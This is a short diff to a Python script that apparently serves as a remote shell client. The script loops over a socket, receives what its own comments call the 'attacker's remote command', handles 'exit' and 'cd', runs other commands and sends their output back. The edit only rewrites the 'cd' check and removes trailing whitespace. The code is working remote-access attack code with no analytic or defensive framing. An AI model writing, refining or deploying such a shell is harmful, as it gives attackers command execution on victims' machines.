@@ -10,7 +10,7 @@ while True:
     command = s.recv(1024)        # receive attacker's remote command
     if command == "exit":         # quit shell
         break
-    if command.startswith("cd "): # change directory
+    if len(command) > 3 and command[0: 3] == "cd ": # change directory
         os.chdir(command[3:])
         s.send(" ")
         continue;
@@ -22,5 +22,5 @@ while True:
         output = " "
     s.send(output)
 
-# done 
+# done
 s.close()
